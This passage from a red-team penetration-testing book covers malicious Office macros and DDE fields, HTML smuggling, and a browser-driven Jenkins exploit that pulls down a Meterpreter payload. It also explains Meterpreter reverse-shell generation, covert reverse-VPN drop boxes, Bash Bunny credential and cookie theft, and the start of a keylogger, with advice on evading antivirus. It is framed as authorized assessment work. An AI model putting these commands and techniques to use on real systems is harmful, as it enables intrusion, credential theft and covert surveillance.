document. these take a fair amount of time, but have high success rates. micr osoft w ord/excel macr o files one of the older, but tried and tested, methods of social engineering is sending your victim a malicious microsoft office file. why are office files great for a malicious payload? because by default, office files support visual basic for applications (vba) code that allows for code execution. although, more recently , this method has become easily detected by av, it still works in many cases with obfuscation. at the most basic level, we can use either empire or unicorn to create a vba macro: in empire: select macro stager usestager windows/macro make sure to configure the proper settings info create the macro generate if you want to create a payload for meterpreter , we can use a tool like unicorn: cd /opt/unicorn ./unicorn.py windows/meterpreter/reverse_https [your_ip] 443 macro start a metasploit handler msfconsole -r ./unicorn.rc once generated, your payload will look something like the following: as you can see, this is running a simple powershell base64 obfuscated script. this can help get around some av products, but it is important to make sure you test it well prior to going on a live campaign. once you generate a macro, you can create a quick excel document: open excel go to the v iew t ab -> macros -> v iew macros add a macro name, configure the macro for book1, and click create replace all the current macro code with the generated code save as .xls (w ord 97-2003) or excel macro-enabled now , whenever anyone opens your document, they will get a security warning and a button to enable content. if you can trick your victim into clicking the enable content button, your powershell script will execute, getting you an empire shell. as previously mentioned, the macro method is the old, tried and tested method, so many victims may already be aware of this attack. another route we can take with office files is embedding a batch file (.bat) with our payload. in the newer version of office, objects will not execute if the victim double clicks the .bat file within the word document. we usually have to try to trick them to move it over to their desktop and execute. we can do this in a more automated fashion with luckystrike (https://github.com/curi0usjack/luckystrik e). with luckys trike, we can create excel documents with our payload within the worksheets and even have full executables (exes) stored inside excel documents, which can be triggered using reflectivepe to run all in memory . read more on luckystrike here: https://www .shellntel.com/blog/2016/9/13/luckystrike-a-database-backed-evil-macrogenerator one last tool i want to ment ion for office file executables is vbad (https://github.com/pepitoh/vba d). whe n running vbad, you do have to enable macros in of fice and select the checkbox “t rust access to the vba project object model” in the macro security settings. this allow s the vbad python code to change and create macros. vbad heavily obfuscates your payloads within the ms office document. it also adds encryption, has fake keys to throw off ir teams, and best of all, it can destroy the encryption key after the first successful run (a one-time use malware). another feature is that vbad can also destroy references to the module containing ef fective payload in order to make it invisible from vba developer tool. this makes analysis and debugging much harder. so, not only is it a total pain to reverse, but also if the incident response teams try to analyze the executed word document versus the original document, all the keys will be missing. non-macr o office files - dde one thing about red team attac ks is that sometimes it is all about timing. during one of our assessments, a brand new vulnerable called dde was first announced. it wasn't yet detected by av or any security product, so it was a great way to get our initial entry point. although there are now several security products to detect ddes, it could still be a viable attack in some environments. what is dde? \"windows provides several methods for transferring data between applications. one method is to use the dynamic data excha nge (dde) protocol. the dde protocol is a set of messages and guidelines. it sends messages between applications that share data and uses shared memory to exchange data between applications. applications can use the dde protocol for one-time data trans fers and for continuous exchanges in which applications send updates to one another as new data becomes available.” [https://msdn.microsoft.com/enus/library/windows/desktop/ms648774(v=vs.85).aspx] the team at sensepost did some great research and discovered that ddeexecute was exposed by both msexcel, and msw ord, and that they could be used to create code execution without the use of macros. in w ord: go to insert t ab -> quick parts -> field choose = formula right click on: !unexpected end of formula and select t oggle field codes change the payload to your payload: ddeaut o c:\\\\windows\\\\system32\\\\cmd.exe \"/k powershell.exe [empire payload here]\" empire has a stager that will auto-create the word file and associated powershell script. this stager can be configured by: usestager windows/macroless_msword resources: https://sensepost.com/blog/2017/macro-less-code-exec-inmsword/ are there any other features to abuse in word documents other than 0-day exploits (i.e. https://github.com/bhdresh/cve-2017-0199)? the answer is yes. although we won’ t cover it in this book, an example would be subdoc attacks (https://rhinosecuritylabs.com/research/abusing-microsoft-wordfeatures-phishing-subdoc/). these attacks cause the victim to make an smb request to an attacker server on the internet in order to collect ntlm auth hashes. this may or may not work, as most corporations now block smb related ports outbound. for those that don't, we can use the subdoc_inector (http://bit.ly/2qx ouia) attack to take advantage of this misconfiguration. hidden encrypted payloads as red teamers, we are always looking for creative ways to build our landing pages, encrypt our payloads, and to trick users into clicking run. two different tools with similar processes are embededinhtml and demiguise. the first tool, embededinhtm, \"takes a file (any type of file), encrypt it, and embed it into an html file as resource, along with an automatic download routin e simulating a user clicking on the embedded resource. then, when the user browses the html file, the embed ded file is decrypted on the fly, saved in a temporary folder , and the file is then presented to the user as if it was being downloaded from the remote site. depending on the user's browse r and the file type presented, the file can be automatically opened by the browser .\" [https://github.com/arno0x/embedinhtml] cd /op/embedinhtml python embedinhtml.py -k keypasshere -f meterpreter .xll -o index.html -w once the victim accesses the malicious site, a pop-up prompts the victim to open our .xll file in excel. unfortunately , with the more recent versions of excel (unless misconfigured), the user will need to enable the add-on to execute our payload. this is where your social engineering tricks need to come into play . the second tool, demiguise, \"generates .html files that contain an encrypted hta file. the idea is that when your target visits the page, the key is fetched and the hta is decry pted dynamically within the browser and pushed directly to the user. this is an evasion technique to get around content / file-type inspection implemented by some security-appliances. this tool is not designed to create awesome hta content. there are other tools/techniques that can help you with that. what it might help you with is getting your hta into an environment in the first place, and (if you use environmental keying) to avoid it being sandboxed.\" [https://github.com/nccgroup/demiguise] python demiguise.py -k hello -c \"cmd.exe /c <powershell_command_here>\" -p outlook.application -o test.hta exploiting internal jenkins with social engineering as red teamers, creativity in attacks is what makes our work extremely exciting. we like to take old exploits and make them new again. for example, if you have been perfo rming network assessments, you know that if you come across an unauthenticated jenkins application (heavily used by developers for continuous integration), it pretty much means full compromise. this is because it has a \"feature\" that allows groovy script execution for testing. utilizin g this script console, we can use execute commands that allow shell access to the underlying system. the reason this method has become so popular for compromise is that almost every major company has some instances of jenkins. the problem with an external attack is that these jenkins services are all hosted internally and can't be reached from the outside. how could we execute code on those servers remotely? before we can answer this question, i tell my team to take a step back and build a replica network with jenkins for testin g. once we have a good under standing of how code execu tion requests function, we can now build the proper tools to gain rce. in this case, we solved this problem through a multitude of steps using javascript and webrtc (web real-t ime communications). first, we would need a victim of an organization to visit a public website we own or a page where we have our stored xss payload. once a victim visits our public site, we would execute javascript on their browser to run our malicious payload. this payload would abuse a chrome/firefox \"feature\" which allows webrtc to expose the internal ip of a victim. with the interna l ip, we can then deduce the local subnet of the victim machine to unde rstand their corporate ip ranges. now , we can blast every ip in their network range (the code only scans the local /24, but in a real campaign, you would want to make it much larger than that) with our specially-crafted jenkins exploit over the default jenkins port 8080. the next question is, what payload do we use? if you have played around with the jenkins console shell, you know it is a little finicky , so being able to get complex powershell payloads consistently might be tough. to solve this problem, a tool was created for thp3 called \"generatejenkinsexploit.py\" (https://github.com/cheetz/generatejenkinsexploit), which will take any binary file, encrypt it, and build the malicious attack javascript page. when a victim hits our malicious webpage, it will grab their internal ip and start spraying our exploit to all servers in the /24 range. whe n it finds a vulnerable jenkins server , the attack will send a groovy script payload to grab the encrypted binary from the internet, decrypt it to a file under c:\\users\\public\\r t.exe and execute the meterpreter binary (r t.exe). in concept (diagramed below), this is very similar to a server side request forgery (ssrf) , where we are forcing the victim's browser to re-initiate our connections to internal ips. victim visits our stored xss or malicious javascript page. victim's browse r executes javascript/w ebrtc to get internal ip and blast the local internal netw ork with groovy post payload. upon finding a jenkins server , our groovy code will tell the jenkins server to grab the encry pted payload from the attacker's server , and then decrypt and execute the binary . in this case, our encrypted executable that is downloaded is a meterpreter payload. meterpreter executes on the jenkins server , which then connects to our attacker meterpreter server . note: this vulnerability does not exist in the latest versions of jenkins. versions befor e 2.x are vulnerab le by default as they did not enable csrf protection (allowing for this blind call to /script/) and did not have authentication enabled. full jenkins exploitation lab: we are going to build out a jenkins w indow server , so that we can repeat this attack. install a w indows vm that has a bridged interface on your local network on w indows system, download and install ja va jdk8 download jenkins w ar file http://mirrors.jenkins.io/war -stable/1.651.2/ start jenkins java -jar jenkins.war browse to jenkins http://<jenkins_ip>:8080/ test the groovy script console http://<jenkins_ip>:8080/script exploit jenkins on the thp kali vm: download the thp jenkins exploit t ool (http://bit.ly/2iug8cs) to perform the lab, we first need to create a meterpreter payload msfvenom -p windows/meterpreter/reverse_https lhost=<attacker_ip> lpor t=8080 -f exe > badware.exe encrypt our meterpreter binary cd /opt/generatejenkinsexploit python3 ./generatejenkinsexploit.py -e badware.exe create our malicious javascript page called badware.html python3 ./generatejenkinsexploit.py -p http://<attacker_ip>/badware.exe.encrypted > badware.html move both the encrypted binary and malicious javascript page to the web directory mv badware.html /var/www/html/ mv badware.exe.encrypted /var/www/html/ now , on a completely different system, visit your attacke r webpage http://<attacker_ip>/badware.html using either chrome or firefox. just by visiting that malicious page, your browser blasts your internal /24 network over port 8080 with our groovy payload using javascript and post requests. when it finds a jenkins server , it will cause that server to download our encrypted mete rpreter , decrypt it, and execute it. on a corporate network, you may end up with tons of dif ferent shells. jenkins is just one of the many attacks you can do. anything that allows code execution unauthenticated by a get or post http method could be used in this same scenario. this is where you need to identify what applications our victims utilize internally and craft your malicious exploit. c o n c l u s i o n social engineering is one of those areas that will always be a cat and mouse game. we rely heavily on the human factor and target weaknesses of fear, urgency , and trust. by taking advantage of these vulnerabilit ies, we can create very clever campaigns that have a high success rate on system compromise. in terms of metrics and goals, we need to move away from a reactive model of waiting for users to report phishing/se emails, to a proactive model where we can hunt actively for these types of malicious attacks. 6 the onside kick - physical attacks as part of the security assessment, csk has asked your team to do a physical assessm ent of the facility. this entails checking if their gates and protections are adequate, and if able to get on the premises, validating how the guards react and their response times. *quick note: please make sure to check with local, state, and federal laws prior to doing any physical assessments. for example, in mississippi, ohio, nevada, or virginia, just having lock picks could be considere d illegal. i am not a lawyer , so it would be wise for you to consult with one first. also, ensure you have proper approva l, work with the facility's physi cal security teams, and have a signof f paper in case you get caught. prior to the actual engagement, work with the physical security team to discuss what happens if security guards catch you, if you can run or if you have to stop, and if there is someone monitoring the radios. also, make sure the guards do not contact local law enforcement. the last thing you want is to actually go to jail. now , it's time to break into the cyber space kittens' secret facility . per the website, it looks like it is located on 299792458 light dr. after we do some reconnaiss ance on google street, we notice that this facility is gated and has a guard shack or two. we can identify multiple entry points and areas where we might be able to get over the fence. with an initial walkthrough, we also identify some cameras, gates, entry points, and card reader systems. card reader cloners card reader cloners were heavil y covered in thp2, so i will mainly go into updates. for the most part, hid badges that don't require any public/private handshakes are still vulnerable to clone and bruteforce id numbers. in thp2, we loved cloning proxcard ii badges as they don't have any protections, can be cloned easily , and cards are generally purchased in bulk incrementally , which allow for easy bruteforcing. this was all done using the prox mark3 device. since then, a much more portable version of this device has been release d called proxmark3 rdv2 kit (http://hackerwarehouse.com/product/proxmark3-rdv2-kit/). this version can be configured with a battery and is much smaller than the original proxmark3. other common cards we come across: hid iclass (13.56 mhz) hid proxcard (125 khz) em4100x (125 khz) mifare classic (13.56 mhz) here is a great resource to check out by kevin chung: https://blog.kchung.co/rfid-hacking-with-the-proxmark-3/. physical tools to bypass access points we won't get into physical tools and how-tos, as that is an entire book and requires a great deal of experience. as always, the best way to do physical assessments is to practice, build physical labs, and figure out what works and what doesn't. in terms of some cool tools that we have used in the past: lock picks (https://www .southord.com/) - southord has always been our go-to for lock picks. great quality and works well. gate bypass devices (https://www .lockpickshop.com/ga tebypass.html) - t ool for getting around locked gates. shove-it t ool (https://www .lockpickshop.com/sj-50.html) simple tool if there is adequate space been a door and the latch. similar to the credit card swipe to open doors, you use the shove-it tool to go behind the plunger and pull back. under the door 2.0 (https://shop.riftrecon.com/products/under the-door -tool) – t ool for doors that have the lever handle. we can use the under the door tool to literally go under the door , wrap around the lever handle, and pull down. back in the day , these were commonly found in hotels, but we definitely do come across them in businesses, too. air canisters - a cheap and easy tool to get around doors that unlock with motion sensors on the inside. check out this video to see samy kamkar bypass these types of doors: https://www .youtube.com/watch?v=xca7ixsnmze remember , the purpose of these tools and physical assessments is to track and monitor how a company's physical security program respon ds. so it is our job to make sure we adequately document not only flaws in the system, but also if the response times and handling of the incident were acceptable. lan t urtle (lanturtle.com) the lan turtle is one of my favorite tools from hak5. in the prior books, we have looked into raspberry pi and odroid small form factors for drop boxes. running kali linux on these devices and having them either ssh or vpn back into our attacker machines was a great way to do physical penetration tests. these drop boxes have continued to evolve through the years. now , the lan turtle is one that can be hidden behind any machine, powered by usb, and transparent to the user. the lan turtle uses the usb as a nic card and proxies all traf fic through the ethernet cable. there is also a 3g cellular edition, but we won't be demonstratin g that here. setting up the lan t urtle: so the lan turtle's purpose is to replace the dropbox. although it has a load of other features like autossh, dns spoofing, meterpreter , ptunnel, script2email, urlsnarf, responde r, and more, the main red team use is to gain access into the network. historically , and even in prior thp books, we used ssh reverse shells. these generally work adequately , but for more in-depth scanning/complex attacks, we need full access into the network. to do this, we are going to have to configu re a reverse vpn connection. what does a reverse vpn connection look like? well, since the lan turtle will be dropped on the back of one of the desktops inside an organization, we won't be able to directly connect to it. therefore, we will have the lan turtle first go outbound via port 443 to vpn back to our openvpn as server . from our attacker kali box, we will have to also log into the vpn server . once the lan turtle and our attacker machine are vpned into our server , we can route our traffic through the lan t urtle to scan or exploit boxes. although openvpn reverse tunnels aren't new, the team at hak5 did a really good job putting a tutorial together . i have had to modify some of the following commands, but watch their youtube video for a more detailed explanation: https://www .youtube.com/watch?v=b7qr0lam8ka. there are three major parts to this: first, we are going to have to set up an openvpn as server on the internet second, we are going to have to configure the lan t urtle third, we are going to have to configure our attacker machine setting up a vps openvpn as server: we want to make sure that our vpn server is externally facing. we generally like to host our vpn servers on vps servers as they are extremely easy and quick to set up. as a caveat, please check with your vps provider to make sure you are allowed to do certain activities. two providers we usually see people use are linode and amazon lightsail. this is because these vps providers are quick, cheap, and super easy to set up. in this case, we are going to be using a ws lightsail. the other reason to pick certain vps providers is because of detection of traf fic. using a ws, i know that most likely , the victim's network will have a lot of traffic to a ws servers. this would allow me to hide within their traf fic. go to lightsail.aws.amazon.com and create a new vps once created, go to manage -> networking add two firewall tcp ports (443 and 943) we are all done creating the vps server . now let's login: make sure to chmod 600 your ssh keys and log into your server ssh -i lightsaildefaultprivatekey-us-west-2.pem ubuntu@[ip] after sshing into the server go to root: sudo su update server: apt-get update && apt-get upgrade install openvpn as. go here to find latest version: https://openvpn.net/index.php/accessserver/download-openvpn-as-sw/1 13.html? osfamily=ubuntu copy the link and download it onto the vps. example: wget http://swupdate.openvpn.or g/as/openvpn-as2.1.12-ubuntu16.amd_64.deb install openvpn as: dpkg -i openvpn-as-2.1.12ubuntu16.amd_64.deb delete the current profile and configure openvpn: /usr/local/openvpn_as/bin/ovpn-init during the setup: make sure to set the admin ui to all interfaces set use local authentication via internal db to yes update openvpn passwords: passwd openvpn this is a great time to put ipt ables for port 943 to only allow connections from your networks set up openvpn as server: goto https://[ip address of vps server]:943/admin/ login with user account \"openvpn\" and the password you just created if you are using a ws lightsail: go to server network settings and make sure the: hostname or ip address is the right public ip address and not the priv ate one save and update verify authentication is set to local: authentication -> general -> local -> save settings > update server create t wo users with allow auto-login enabled (i did lanturtle and redteam): user management -> user permissions for each user: set allowauto-login make sure to set passwords for both of them for the lanturtle account, to allow connectivity via vpn, we need to enable some permissions: make sure to configure/enable under user permissions: all server -side private subnets all other vpn clients download openvpn profiles: connect to download profiles: https://[y our vps]:943/?src=connect for each user (redteam and lanturtle) login and download profile - y ourself (autologin profile) save as turtle.ovpn and redteam.ovpn setting up the lan t urtle and initial configuration: plug in usb and ethernet nmap the local network for port 22 nmap x.x.x.x/24 -p22 -t5 --open ssh with root@[ip] with a password of sh3llz update your lan tur tle it is important to change your mac address. lan t urtles use similar manufacturer mac addresses, so you will want to make sure you look like a random device: change your mac address install openvpn: go to modules -> select -> configure -> directory yes install openvpn set up your openvpn profile: go back to modules -> openvpn -> configure -> paste everything all from turtle.opvn and save we also want to make sure that the lan t urtle openvpn server starts up at bootup, so we can just drop it and run: go to modules -> openvpn -> enable lastly , we need to modify our firewall rules on our lan turtle: exit out of the turtle menu and edit our firewall rules nano /etc/config/firewall under: config zone 'vpn' make sure \"option forward\" is set to accept add the following config forwarding rules: config forwarding option src wan option dest lan config forwarding option src vpn option dest wan config forwarding option src wan option dest vpn log back into the turtle menu -> modules -> openvpn -> start this should start the openvpn client on our t urtle. t o make sure it works, go back into our openvpn as server and check for connections. we now have the lan turtle configured so that any time it connects to a network, it connects back to our vpn server and we can ssh into the lan turtle. let's walk through an example: accessing the vpn server from our kali attacker host: openvpn --config ./redteam.ovpn we need to get the ip address of the network they are on in order to route all traf fic through from our redteam vpn ssh into the lan t urtle exit the turtle menu and get the ip address of the internal interfac e (ifconfig) of the victim network. figure out the ip range based on the ip and bcast. in our example, the network that the turtle is on is 10.100.100.0/24 lastly , let's enable forwarding: go back into the openvpn as and edit the user lanturtle user permissions -> for lanturtle -> show edit vpn gateway to y es and add internal range (i.e. 10.100.100.0/24) save and update from the ssh connection on the lan t urtle, reboot with the command: reboot now , we can vpn from our attacker box and route all of our traffic through the vpn lan turtle into the victim corporate netwo rk. in the following image , we are logge d into the vpn server , scannin g the lan turtle's internal network of 10.100.100.0/24. we can see that we have successfully configured the routes from the vpn gateway , through the lan turtle, to the corp network. from our kali attacker machine, we can run full vulnerability scans, web scrapes, masscans, and more. that’ s it! you now have a quick-drop device that will let you keep a full connection into a victim network. a few things you can do to be more successful: put a cronjob that resets the device every day. tunnels can break and every time the turtle reboots, a new connection is restarted. some corporations block certain ports outbound. in this case we used port 443, which in many environments would be allowed outbound. for other companies that use web proxies, direct traffic outbound via 443, might be blocked. you may need to configure the lan turtle to automatically try multiple different ports or protocols (tcp/udp) on start up. if you are going to drop two or more devices, make sure the vpn servers and mac addresses are different. we have had instances where our devices were found during engagements and almost every time, it was by accident because it was moving or changing out computers. packet squirrel another tool from hak5 that has similar features as the lan turtle is the packet squirrel. the packet squirrel requires a usb micro to be powered, but instead of one end being a usb ethernet adaptor , on the packet squirrel, both ends are etherne t cables. this is another discrete way to either capture traf fic or create a vpn connection. similar to the lan t urtle for configuring the packet squirrel; edit the /root/payloads/switch3/payload.sh for_clients=1 edit /etc/config/firewall make the exact same firewall changes you did for the lan t urtle upload the lant urtle.ovpn file to /root/payloads/switch3/config.ovpn you now have another device that, once connected to the network, will have a reverse vpn connection back into the company . also, if you do own a packet squirrel, plenty of awesome research has been done on it. you can easily convert the packet squirrel into an openwr tbased dyi disposable pen-test drop box (https://medium.com/@tomac/a15-openwrt-based-diy-pen-test-dropbox-26a98a5fa5e5) using sword. resources: https://www .hak5.or g/episodes/hak5-1921-access-internalnetworks-with-reverse-vpn-connections http://www .ubuntuboss.com/how-to-install-openvpn-accessserver -on-ubuntu-15-10/ https://trick77.com/how-to-set-up-transparent-vpn-internetgateway-tunnel-openvpn/ https://www .hak5.or g/gear/packet-squirrel/docs bash bunny in the previous books, we talked about the rubber ducky (https://hakshop.com/collections/usb-rubber -ducky) and how it emulates hid devices, like keyboards, to store commands. as red teamers, the rubber ducky is still a great tool as it can speed up the delivery of powershell commands, be used for social engineering exercises, and can allow comprom ises on kiosk systems that might not have a keyboard, but have usb slots. the bash bunny is the advanced version of this. not only can it perform hid style attacks, but it can also do a world more. the bash bunny has two separate settings to store two attacks (and one extra setting for management). these payloads can perform attacks to steal credentials, conduct phishing, perform ducky attacks, run powershell commands, perform scanning and recon, execute metasploit autopwn, and more. in the prior book, we spoke about using konboot (http://www .piotrbania.com/all/kon-boot/) to get around machines to which you don't have passwords. konboot works on non-encrypted machines, where it boots up from a usb stick to overwrite the local administrative passwords. although this does require a full reboot, this gets you onto a machine without credentials. if you haven't played around with konboot, we use it all the time on engagements and have had great success. there are two reasons why you may not want to use konboot: (1) this attack will not work on encrypte d machines, and/or (2) you may not want to reboot the victim’ s computer . how can you get informatio n from the locked system to get access to additional stuff on the network or potentially get hashes/credentials? this is where bash bunny comes into play . we are going to use the bash bunny to run two different attack payloads for us. both of these payloads will allow us to get information from a locked (or unlocked) system if we have physical access to it. we are going to demonstrate the use of bunnyt ap and quickcreds. breaking into cyber space kittens you have finally broken into the cyber space kittens facility after hours. with no one around you have a few hours to hack around. you get to your first machine and drop konbo ot and reboot the system, but notice these systems are encrypted. you then go to the next machine which was left at the locked screensaver state. you plug in your bash bunny twice, running both the bunnyt ap and quic kcreds switches. after a few minutes, quickcreds, which runs the infamous responder , collects netntlmv2 hashes. we throw those into hashcat and crack the user's password in minutes! on machines where we can't get or crack hashes, bunnytap spins up posiont ap, which captures cookies for popular sites and can be configured for internal applicat ions. we take these cookies, connect our attacker laptop to their network, replace their cookies with ours for sensitive web applications, and gain access to those web applications without ever knowing a single password. setting up bash bunny on kali download the latest firmware: https://bashbunny .com/downloads put the bash bunny on switch 3 - arming mode (closest to the usb port) drop the firmware on the root of the usb mount, unplug, replug, and wait for about 10 minutes until it blinks blue once it's all done, go back into the bash bunny and edit the file under: payloads > switch1 > payload.txt # system default payload led b slow attackmode ecm_ethernet st orage unplug your device on your kali box, set up the internet sharing: wget bashbunny .com/bb.sh chmod +x bb.sh ./bb.sh guided mode (chose all defaults) on the bash bunny , put it on switch 1 (farthest away from the usb) and plug in. once complete, make sure you connect to the bash bunny , where you should see the cloud <-> laptop <> bunny image on your kali machine, ssh into the bash bunny with password hak5bunny logging into the bash bunny on your kali machine, ssh into the bash bunny with password hak5bunny ssh root@172.16.64.1 let's update and install some tools on the bash bunny apt-get update apt-get upgrade export git_ssl_no_verify=1 git clone https://github.com/lgandx/responder .git /tools/responder git clone https://github.com/coresecurity/impacket.git /tools/impacket cd /tools/impacket && python ./setup.py install apt-get -y install dsnif f in another terminal on your kali machine, install all the modules you want. git clone https://github.com/hak5/bashbunnypayloads.git /opt/bashbunny-payloads you can select any type of payload, but in our case, we are going to set up the bash bunny with two payloads: bunnyt ap and quickcreds cp -r /opt/bashbunnypayloads/payloads/library/credentials/bunnyt ap/* /media/root/bashbunny/payloads/switch1/ cp -r /opt/bashbunnypayloads/payloads/library/credentials/quickcreds/* /media/root/bashbunny/payloads/switch2/ note, in each of the switch1 and 2 folders is a file named payload.txt. in each of these files, you need to configure it to either attack w indows or mac machines. for w indows machines, make sure the attackmode is set to rndis_ethernet and for mac, configure it to ecm_ethernet quickcr eds quickcreds is an awesome tool that utilizes responder attack to capture ntlmv2 challenge hashes from locked and unlocked machines. let's say you do a physical assessment where you break into a building and come across a bunch of locked mach ines. you plug in the bash bunny on the switch with quickcreds and wait about 2 minutes per machine . the bash bunny will take over the network adaptor , reroute any request s for shares and authentication using response, and then log that data. it saves all creds to the loot folder on the usb disk. references: https://github.com/hak5/bashbunnypayloads/tree/master/payloads/library/credentials/quickcreds https://room362.com/post/2016/snagging-creds-from-lockedmachines/ bunnyt ap bunnyt ap is based on samy kamkar's infamous poisont ap (https://www .youtube.com/watch?v=aatp5gcskvk). poisont ap was an awesome tool that, even from a locked machine, does the following: emulates an ethernet device over usb (or thunderbolt) hijacks all internet traf fic from the machine (despite being a low priority/unknown network interface) siphons and stores http cookies and sessions from the web browser for the alexa top 1,000,000 websites exposes the internal router to the attacker , making it accessible remotely via outbound w ebsocket and dns rebinding (thanks matt austin for the rebinding idea!) installs a persistent web-based backdoor in http cache for hundreds of thousands of domains and common javascript cdn urls, all with access to the user ’s cookies via cache poisoning allows attacker to remotely force the user to make http requests and proxy back responses (get & post s) with the user’s cookies on any backdoored domain does not require the machine to be unlocked backdoors and remote access persist even after device is removed and attacker sashays away [https://samy .pl/poisontap/] from a physical assessment perspective, you go into their of fice, plug it into each machine, and wait about 2 minutes. the bash bunny will route all traffic to the bash bunny . if they have a browser open and active (like ads or any page that regularly updates), the bunnyt ap will kick in and request all the alexa top 1,000,00 websites. if the victim user is logged into any of these sites at the time, the bunnyt ap will capture all of the victim's cookies. now , we can take these cookies onto our own computers, replace our cookies with theirs, and become them without ever knowing their passwords. make sure to check out all the cool bash bunny payloads: https://github.com/hak5/bashbunnypayloads/tree/master/payloads/library . w i f i in terms of wifi, there haven't been any significant changes in how we attack clients. although we are starting to see significantly less wep networks, the attacks still consist of deauth, aireplay-ng, and capturing iv packets. for wpa wireless netw orks, the best option here still is to deauth a client, capture the handshak e, pass it over to hashcat, and crack the password. both these methods work great and my favorite tool to use is the completely rewritten version of wifite2 (https://github.com/derv82/wifite2) using an alfa awus036nha wireless card. this is a simple-to-use interface as it can support numerous attacks, sits on top of aircrack, and makes it easy to crack the captured hashes. in terms of equipment, other than getting a couple alfas, the easy way to perform more evasive wifi attacks is using the wifi pineapple nanos (https://www .wifipineapple.com/pages/nano). if you need to spin up a fake hostap , reroute traffic through another antenna, stand up fake pages to capture authentication, perform all the mitm attacks, run responder , and other attacks, the nano is a lightweight hardware tool to perform this. for those who don't subscribe to the pineapple, there are some great tools out there that do many of the corporate attacks. one of these tools is eaphammer (https://github.com /s0lst1c3/eaphammer). the features of eaphammer: steal radius credentials from wpa-eap and wpa2-eap networks. perform hostile portal attacks to steal ad creds and perform indirect wireless pivots perform captive portal attacks built-in responder integration support for open networks and wp a-eap/wp a2-eap no manual configuration necessary for most attacks. no manual configuration necessary for installation and setup process leverages latest version of hostapd (2.6) support for evil twin and karma attacks generate timed powershell payloads for indirect wireless pivots integrated http server for hostile portal attacks support for ssid cloaking the best part of eaphammer is using the custom attack features to perform responder style attacks or capture ntlm challenge authentication hashes for cracking (https://github.com/s0lst1c3/eaphammer#iii---stealing-adcredentials-using-hostile-portal-attacks) and indirect pivots (https://github.com/s0lst1c3/eaphammer#iv---indirect-wireless-pivots). c o n c l u s i o n physical attacks are one of the most fun to do. they get the adrenaline pumping, make you feel like a criminal, and force you to think evilly . on many of our engagements, we may spend a couple days just casing a company , watching the guard rotations, and figuring out what types of doors they have. we might try to take long range photos of their badges, record hours when people leave the building, and identify weak spots that would get us into the building. from a red team perspective, we want to take note of weak spots not only in their physical security , but in their people as well. if you trigger an alarm, how long does it take for someone to check it out? are the cameras monitored 24/7? if so, if something is suspicious, how long until a comes to investigate? are the employees watching for tail-gating? if you do get stopped, are you able to talk your way out of it? if you dress up as someone similar to facilities staff (or any third party service) what types of reactions do you get? last note, before you get started , make sure you have a well-defined scope, a get out of jail letter , phone numbers for the ciso/physical security , and be sure to work with the company . the more you can detail out, the less likely you will be thrown onto the ground by guards, but there's no guarantee . . . 7 the quarterback sneak - evading av and network detection writing code for red team campaigns one of the things that sets apart successful red teamers and penetration testers is the ability to adapt and understand different protection s. whether it is understanding low-level assembly , writing shellcode, creating a custom c2 binary , or modifying code caves to hide our malware, it's all part of our daily job. i come across pentesters all the time who can't code and although it is not a requirement, it definitely causes a plateau in their professional growth. therefore, i wanted to dedicate a section to those who haven't really coded in lower -level languages in order to give them a start. the basics building a keylogger keyloggers are an essential tool to any pentest/red team and this section will walk you through making a generic keylogger . there are times when we just want to continually monitor a certain user or get additional credentials. this might be because we can't get any sort of lateral movement/privilege escalation or we might just want to monitor the user for future campaigns. in these cases, we like to drop keyloggers that continually run on a victim's system and send their keystrokes outbound. the following example is just a poc and the purpose of this lab is for you to understand the basics and build from here. the reasons it is all in c are to keep the binary relatively small, have better os control due to lower level languages, and evade av. in the prior book, we wrote a keylogger in python and compiled it with py2exe to make it into a binary , but those can be easily detected. let's walk through a slightly more complex example. setting up your envir onment this is the basic setup you need to write and compile in c to make windows binaries and create the custom keylogger . windows 10 in a v irtual machine install visual studio so that you could use the command line compiler along with v im for code editing the best coding resource for windows api programming by far is microsoft’ s own development network (msdn) website found here: www .msdn.microsoft.com. msdn is an invaluable resou rce that details system calls, type and struct definitions, and includes dozens of examples. while it wasn't really needed for this project, a more in-depth understanding of the windows os can be found by reading the windows internals books published by microsoft press. for c, there is a good book co-authored by one of the founders of c called, the c programming language by kernighan and ritchie. lastly , read beej’s guide to network programming, available in print and online, which is a great primer on socket programming in c. compiling fr om sour ce in these labs, there are going to be multiple code samples and examples. the labs will be compiling the code using microsoft’ s optimizing compiler , which comes with visual studio community and is built into the visual studio developer command prompt. once vs community is installed, make sure to also install the universal windows platform development and desktop development with c++ under tools -> get tools and features. to compile the examples, open up an instance of the developer comm and prompt, then navigate to the folder that contains the source files. finally , run the command “cl sourcefile.c io.c”. this will produce an executable with the same name as the source file. the compiler defaults to 32-bit , but this code can also be compiled in 64bit. to compile the code for 64-bit, run the batch script located in the visual studio folder . in a command prompt, navigate to “c:\\program files (x86)\\microsoft visual studio\\2017\\community\\vc\\auxiliary\\b uild”, note that this path might change depending on your version of visual studio. then, run the command “vcvarsall.bat x86_amd64”, this will set the microsoft compiler to compile 64-bit binaries instead of 32-bit. now , you can compile the code by running “cl path/to/code.c”. sample framework the goal of this project is to create a keylogger that utilizes c and low-level windows functions to monitor keystrokes. this keylogger makes use of the setw indowshookex and lowlevelkeyboardproc functions. setw indowshookex allows the setting of various types of hooks in both local and global contexts. in this case, the wh_keyboard_ll parameter will be used to pull low-level keyboard events. the function prototype for setw indowshookex looks like this (http://bit.ly/2qbezsc): hhook winapi setw indowshookex( _in_ int idhook, _in_ hookproc lpfn, _in_ hinst ance hmod, _in_ dword dwthreadid ); the function takes an integer to a hook id, a pointer to a function, a handle module, and a thread id. the first two values are the most important. the hook id is an integer for the type of hook that you are going to install. windows has the available ids listed on the function page. in our case, the id 13, or wh_keyboard_l l will be used. the hookproc is a pointer to a callback function that will be called every time the hooked process receives data. this means that every time a key is pressed, the hookproc will be called. this is the function that will be used to write the keystrokes to the file. hmod is a handle to a dll that contains the function that the lpfn points to. this value will be set to null because a function is used in the same process as setw indowshookex. dwthreadid will be 0 to associate the callback with all of the threads on the desktop. finally , the function returns an integer , which will be used to verify that the hook was set properly or exit otherwise. the second part that is required will be the callback function. the callback function will do the heavy lifting for this program. this function will handle receiving the keystrokes , transforming them into ascii letters, and all of the file operations. the prototype for the lowlevelke yboardproc (http://bit.ly/2homcyq) looks like this: lresul t callback lowlevelkeyboardproc( _in_ int ncode, _in_ wp aram wparam, _in_ lp aram lparam ); let's review what is required for the lowlevelkeyboard proc. the parameters for the function are an integer that tells windows how to interpret the message. two of these parameters are: (1) wparam, which is an identifier of the message, and (2) lparam, which is a pointer to a kbdllhookstruct structu re. the values for wparam are specified in the function page. there is also a page that describes the members of a kbdllhookstruct . the value of the lparam kbdllhookstruct is the vkcode or 